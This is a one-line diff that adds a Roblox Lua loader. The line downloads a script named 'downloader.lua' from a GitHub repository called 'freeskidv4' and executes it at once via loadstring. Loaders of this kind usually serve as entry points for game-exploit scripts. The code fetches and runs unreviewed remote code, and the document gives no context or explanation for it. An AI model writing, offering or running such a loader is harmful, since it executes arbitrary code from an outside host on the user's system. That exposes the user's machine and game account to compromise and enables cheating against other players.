@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/continentalscript/freeskidv4/main/downloader.lua", true))()
